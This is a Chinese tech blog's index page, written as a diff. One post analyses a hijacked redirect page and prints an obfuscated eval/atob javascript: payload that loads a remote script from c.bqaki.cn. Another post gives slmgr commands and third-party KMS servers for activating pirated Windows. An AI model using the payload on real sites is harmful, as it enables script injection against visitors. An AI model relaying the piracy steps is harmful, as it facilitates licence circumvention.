@@ -1,0 +1,936 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/css/main.min.css">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"nobige.cn","root":"/","scheme":"Gemini","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"https:/cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/sitemap.xml"};
+  </script>
+
+  <meta name="description" content="Record the pit filling process with words">
+<meta property="og:type" content="website">
+<meta property="og:title" content="NoBige-JackCh3n">
+<meta property="og:url" content="https://nobige.cn/page/11/index.html">
+<meta property="og:site_name" content="NoBige-JackCh3n">
+<meta property="og:description" content="Record the pit filling process with words">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="JackCh3n">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://nobige.cn/page/11/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: true,
+    isPost: false
+  };
+</script>
+
+  <title>NoBige-JackCh3n</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-122817633-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?96741f92c07d010c0ddd1d02197893e2";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">NoBige-JackCh3n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">copy to my blog</p>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>Sitemap</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://nobige.cn/post/20190729-ru_you_le_xiang_bei_hei_tiao_zhuan_ye_mian_fen_xi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/images/avatar.png">
+      <meta itemprop="name" content="JackCh3n">
+      <meta itemprop="description" content="Record the pit filling process with words">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NoBige-JackCh3n">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/post/20190729-ru_you_le_xiang_bei_hei_tiao_zhuan_ye_mian_fen_xi/" class="post-title-link" itemprop="url">如有乐享被黑跳转页面分析</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-07-29 22:25:15" itemprop="dateCreated datePublished" datetime="2019-07-29T22:25:15+08:00">2019-07-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E5%B7%A7/" itemprop="url" rel="index">
+                    <span itemprop="name">技巧</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/post/20190729-ru_you_le_xiang_bei_hei_tiao_zhuan_ye_mian_fen_xi/johnccc-SBPO8p4Uqdo-unsplash.jpg" alt="Home decor"></p>
+<h2 id="故事"><a href="#故事" class="headerlink" title="故事"></a>故事</h2><blockquote>
+<p>去年的时候博客针对第三方网址地址跳转做了一个html页面，来做跳转用！这样能一定程度减少博客的权重的流失！</p>
+<p>这个HTML跳转页面是纯JS实现的，页面上也没做安全判断！</p>
+<p>但是过了一段时间突然发现域名被微信封了，不在微信分享网页了<del>~</del></p>
+<p>经过分享发现原来是有人恶意利用这个html跳转页面，跳转到菠菜网站！！</p>
+<p>博主发现后立即在这个页面中加了有效的判断，然后开始漫长的申请解封的道路！</p>
+</blockquote>
+<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">含有恶意欺诈网页:  https:&#x2F;&#x2F;51.ruyo.net&#x2F;go&#x2F;index.html?u&#x3D;javascript:parent[String.fromCharCode(101;118;97;108)](parent[String.fromCharCode(97;116;111;98)](&quot;ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPS8vYy5icWFraS5jbi94cy5qcz48L3NjcmlwdD4iKQ&#x3D;&#x3D;&quot;));&#x2F;&#x2F;241137&#x2F;241137.html#pt_1520302119694</span><br></pre></td></tr></table></figure>
+
+<p>拆开得到javascript代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javascript:parent[<span class="built_in">String</span>.fromCharCode(<span class="number">101</span>;<span class="number">118</span>;<span class="number">97</span>;<span class="number">108</span>)](parent[<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>;<span class="number">116</span>;<span class="number">111</span>;<span class="number">98</span>)](<span class="string">"ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPS8vYy5icWFraS5jbi94cy5qcz48L3NjcmlwdD4iKQ=="</span>));<span class="comment">//241137/241137.html#pt_1520302119694 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//parent() 方法返回被选元素的直接父元素。</span></span><br><span class="line"><span class="comment">//fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。</span></span><br><span class="line"><span class="comment">//这个几个Unicode 值分别等于</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>101 = e</li>
+<li>118 = v</li>
+<li>97 = a</li>
+<li>108 = l</li>
+<li>97 = a</li>
+<li>116 = t</li>
+<li>111 = o</li>
+<li>98 = b</li>
+</ul>
+<p>连起来,得到eval atob,猜测可能是js函数</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>()<span class="comment">// 函数计算 JavaScript 字符串，并把它作为脚本代码来执行。</span></span><br><span class="line">atob() <span class="comment">//方法用于解码使用 base-64 编码的字符串。</span></span><br></pre></td></tr></table></figure>
+
+<p><code>ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPS8vYy5icWFraS5jbi94cy5qcz48L3NjcmlwdD4iKQ==</code></p>
+<p>解码得到</p>
+<p><code>document.write(&quot;&lt;script src=//c.bqaki.cn/xs.js&gt;&lt;/script&gt;&quot;)</code></p>
+<p>我访问这个链接的时候已经是找不到这个ip地址了<em>（网站挂了）</em>但是在网上找到了缓存，估计是有人也是遭遇同样的情况然后用<strong>urlscan.io</strong> 扫描了一下</p>
+<p>大概信息是</p>
+<ul>
+<li>扫描时间：2018年1月4日</li>
+<li>服务器地址：天津 天津 , 中国</li>
+</ul>
+<p>完整的缓存js代码是</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/post/20190729-ru_you_le_xiang_bei_hei_tiao_zhuan_ye_mian_fen_xi/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://nobige.cn/post/20190729-WindowsOS_cong_xia_zai_dao_ji_huo_dao_ban/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/images/avatar.png">
+      <meta itemprop="name" content="JackCh3n">
+      <meta itemprop="description" content="Record the pit filling process with words">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NoBige-JackCh3n">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/post/20190729-WindowsOS_cong_xia_zai_dao_ji_huo_dao_ban/" class="post-title-link" itemprop="url">WindowsOS从下载到激活盗版</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-07-29 20:30:06" itemprop="dateCreated datePublished" datetime="2019-07-29T20:30:06+08:00">2019-07-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E5%B7%A7/" itemprop="url" rel="index">
+                    <span itemprop="name">技巧</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/post/20190729-WindowsOS_cong_xia_zai_dao_ji_huo_dao_ban/johny-vino-R54V69BN0MI-unsplash.jpg" alt="Getting ready"></p>
+<h2 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h2><p>​    这是2019、2、27写的文章，迟迟未发布，考虑很多，害怕收到律师函之类的东西，但这些提供服务的网站截至到发稿时都还好好的便将其放出来</p>
+<h2 id="盗版"><a href="#盗版" class="headerlink" title="盗版"></a>盗版</h2><p>​    盗版（又称“翻版”）指在未经版权所有人同意的情况下，对其作品、出版物进行复制、再分发的行为，以及以此行为制成的侵权产品。在很多国家和地区，这种行为被定义为侵犯知识产权的违法行为，甚至犯罪行为，会受到所在国的处罚。盗版出版物通常包括盗版书籍、盗版软件和盗版音像作品。</p>
+<h2 id="态度"><a href="#态度" class="headerlink" title="态度"></a>态度</h2><p>​    盗版就是偷</p>
+<h2 id="What-is-kms-activation"><a href="#What-is-kms-activation" class="headerlink" title="What is kms activation"></a>What is kms activation</h2><p>​    KMS，全称Key Management Service,是微软官方认可的一种系统激活方式，普遍适用于企业。</p>
+<h2 id="关我屁事"><a href="#关我屁事" class="headerlink" title="关我屁事"></a>关我屁事</h2><p>​    利用这个我们可以<del>开心的</del>激活电脑上的windows系统，支持windows7，windows8，windows10等等，还不要钱，免费！</p>
+<h2 id="系统下载"><a href="#系统下载" class="headerlink" title="系统下载"></a>系统下载</h2><p><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/post/20190729-WindowsOS_cong_xia_zai_dao_ji_huo_dao_ban/kmsVl.png" alt="支持kms的VL"></p>
+<ul>
+<li><a href="/go.html?u=http://msdn.itellyou.cn/">MSDN, 我告诉你</a></li>
+<li><a href="/go.html?u=http://emtrek.org/viewforum.php?f=264">lopatkin精简版</a></li>
+<li>推荐从上面两个地方下载你要的系统，或者是微软官网</li>
+</ul>
+<h2 id="激活Windows"><a href="#激活Windows" class="headerlink" title="激活Windows"></a>激活Windows</h2><ul>
+<li><p>以管理员身份打开命令提示符,然执行下列命令(以kms.03k.org为例)：</p>
+</li>
+<li><p>也可以另存为bat批处理文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">::<span class="built_in">cd</span> /d <span class="string">"%SystemRoot%\system32"</span></span><br><span class="line">slmgr /skms kms.03k.org</span><br><span class="line">slmgr /ato</span><br><span class="line">slmgr /xpr</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="KMS服务器"><a href="#KMS服务器" class="headerlink" title="KMS服务器"></a>KMS服务器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kms.cangshui.net</span><br><span class="line">kms.moeclub.org</span><br><span class="line">kms.03k.org</span><br><span class="line">kms.library.hk</span><br></pre></td></tr></table></figure>
+
+<h2 id="懒"><a href="#懒" class="headerlink" title="懒?"></a>懒?</h2><p>懒得一个个打<del>（复制粘贴）</del>为此网站的站长还热心的提供了一键脚本</p>
+<ul>
+<li><a href="/go.html?u=https://cangshui.net/-down/-mysh/kms/KMS-Cangshui.net.bat">沧水的一键脚本</a></li>
+<li><a href="/go.html?u=https://kms.library.hk/kms.zip">提供的一键脚本</a></li>
+</ul>
+<p>效果图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/post/20190729-WindowsOS_cong_xia_zai_dao_ji_huo_dao_ban/runKmsBat.gif" alt="沧水的一键脚本"></p>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p><strong>任何非官方渠道激活的盗版系统均有一定的风险。</strong></p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p> 本文以一个学习的态度，揭露了windows盗版行业背后的阴暗一面。</p>
+<p>​    <strong>任何非官方渠道激活的盗版系统的行为都是可耻的作为一个祖国的花朵，国家的未来，社会的栋梁我们要坚决反对和制止有相关行为的人员。</strong></p>
+<h2 id="KMS-GVLK-列表"><a href="#KMS-GVLK-列表" class="headerlink" title="KMS GVLK 列表"></a>KMS GVLK 列表</h2>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/post/20190729-WindowsOS_cong_xia_zai_dao_ji_huo_dao_ban/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://nobige.cn/post/20190729-CORS_on_Apache_php/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/images/avatar.png">
+      <meta itemprop="name" content="JackCh3n">
+      <meta itemprop="description" content="Record the pit filling process with words">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NoBige-JackCh3n">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/post/20190729-CORS_on_Apache_php/" class="post-title-link" itemprop="url">CORS on Apache php</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-07-29 19:44:09" itemprop="dateCreated datePublished" datetime="2019-07-29T19:44:09+08:00">2019-07-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/php/" itemprop="url" rel="index">
+                    <span itemprop="name">php</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <!-- 阅读全文 -->
+            <div class="post-button">
+              <a class="btn" href="/post/20190729-CORS_on_Apache_php/">
+                Read more &raquo;
+              </a>
+            </div>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://nobige.cn/post/20190726-php_wen_jian_shang_chuan_da_xiao_cuo_wu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/images/avatar.png">
+      <meta itemprop="name" content="JackCh3n">
+      <meta itemprop="description" content="Record the pit filling process with words">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NoBige-JackCh3n">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/post/20190726-php_wen_jian_shang_chuan_da_xiao_cuo_wu/" class="post-title-link" itemprop="url">php文件上传大小错误</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-07-26 13:03:38" itemprop="dateCreated datePublished" datetime="2019-07-26T13:03:38+08:00">2019-07-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/php/" itemprop="url" rel="index">
+                    <span itemprop="name">php</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <!-- 阅读全文 -->
+            <div class="post-button">
+              <a class="btn" href="/post/20190726-php_wen_jian_shang_chuan_da_xiao_cuo_wu/">
+                Read more &raquo;
+              </a>
+            </div>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://nobige.cn/post/20190719-mianfeitupianyasuoTinyPngkehuduan/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/images/avatar.png">
+      <meta itemprop="name" content="JackCh3n">
+      <meta itemprop="description" content="Record the pit filling process with words">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NoBige-JackCh3n">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/post/20190719-mianfeitupianyasuoTinyPngkehuduan/" class="post-title-link" itemprop="url">免费图片压缩TinyPng客户端</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-07-19 21:41:31" itemprop="dateCreated datePublished" datetime="2019-07-19T21:41:31+08:00">2019-07-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B0%8F%E7%8E%A9%E6%84%8F/" itemprop="url" rel="index">
+                    <span itemprop="name">小玩意</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/post/20190719-mianfeitupianyasuoTinyPngkehuduan/5b98f9d3ed0cbe41f4a8ab3c.jpg" alt="美女海边"></p>
+<h2 id="借口"><a href="#借口" class="headerlink" title="借口"></a>借口</h2><p>​    在写文章的时候因为需要压缩图片，打开网页还要点击下载，很是麻烦，试过别的软件又不是很满意，要么软件过于庞大，50M起步，有的更是夸张，试过limitPNG2 发现只能支持png，PPDuck3收费（不会破解），Light Image Resizer 5神奇算法还能给图片增量真是佛了，当然了也看了下官网推荐的windows软件都是过于庞大，于是便自己动手写了个软件。用的易语言，界面难看，核心是post。</p>
+<p>​    在写的过程中发现有人也写了一个类似的，但是我本地测试不能用，另一个则是直接调用网页，感觉太娄了。</p>
+<h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><p><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-22-04-01-154.jpg" alt="TinyPng in Windows"></p>
+<h2 id="特色"><a href="#特色" class="headerlink" title="特色"></a>特色</h2><ul>
+<li>小</li>
+<li>免费</li>
+<li>支持批量</li>
+<li>无压缩上限</li>
+<li>CPU不狂涨</li>
+</ul>
+<h2 id="同行产品"><a href="#同行产品" class="headerlink" title="同行产品"></a>同行产品</h2><p>某个我觉的<del>比</del>（非）<del>较</del>（常）<del>差</del>（喽）的截图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/post/20190719-mianfeitupianyasuoTinyPngkehuduan/171349mc81ob0dn9abs39n.png" alt="同行1"></p>
+<p>不能正常运行，但是可以借鉴的软件截图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-21-50-19-924.jpg" alt="同行1"></p>
+<p>limitPNG2 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-21-59-29-123.jpg" alt="limitPNG2 "></p>
+<p>PPDuck3</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-21-59-50-524.jpg" alt="PPDuck3"></p>
+<p>Light Image Resizer 5</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-22-00-05-332.jpg" alt="Light Image Resizer 5"></p>
+<p>bamboo</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-21-58-01-822.jpg" alt="bamboo"></p>
+<p>tinyPNGApp</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige@master/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-21-58-25-443.jpg" alt="tinyPNGApp"></p>
+<h2 id="体验"><a href="#体验" class="headerlink" title="体验"></a>体验</h2><ul>
+<li><p>其中PPDuck3我觉得是体验最好的软件，不管是压缩速度还是界面美观都是很不错的，虽然整个软件有点大，150m左右。未找到</p>
+</li>
+<li><p>limitPNG2 则是只支持png，且速度实在是不敢恭维</p>
+</li>
+</ul>
+<h2 id="思路-amp-收获"><a href="#思路-amp-收获" class="headerlink" title="思路&amp;收获"></a>思路&amp;收获</h2><p>​    说是实话，我对PPDuck3是起了不安分心，想<del>学习破解</del>不劳而获,由于没有破解的底子也就只能任我一番折腾，发现，PPDuck3好像是本地搞了个认证服务器，抓包得知好像又是一个中间站的样子。core.exe会进行联网确认之类的操作。想法很不错，本地又不能建立假的授权站，端口也会因占用而变化。</p>
+<p>​    一开始本来是打算用TinyPng提供的Api来做的，每账号/自然月500张图片压缩上限，还可以支持远程压缩。但是在写的时候发现可以用官网的网页接口，不要api key都可以，自然也是5M的上限，但是图片每次压缩的限制没有了，api应该是pro那种5M~25M的上限吧。</p>
+<p>​    为了证实这个观点，我特意的找了一张6129kb的图片<em>（找了好几家图床才勉强原图上传）</em>接着又用API接口压缩图片，果如我所想是PRO的套餐，那么下次软件也有可以改进的地方了。</p>
+<p>​    花了近半天的时间做这个，主要是不熟悉易语言，C#则是被我卸载了。。。C#好像还要.net的支持。<del>后面再考虑是否改用C#重写</del>（又不是不能用），整个编写过程完全是面向搜索引擎，因为很多控件都没有用过或者不知道叫什么名字。</p>
+<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ul>
+<li><del><a href="#">TinyPng in Windows.rar (371.01 KB)</a></del></li>
+<li>其余下载地址请参考博客文章</li>
+<li><a href="/go.html?u=https://f.tiiao.cn/2019/07/31/TinyPng%20in%20Windows2.rar">TinyPng in Windows2.exe</a><ul>
+<li>更新：添加官网API，支持5M~25M图片</li>
+<li>EXE_MD5:39FEBEE57B845977A2602031C5A54A00</li>
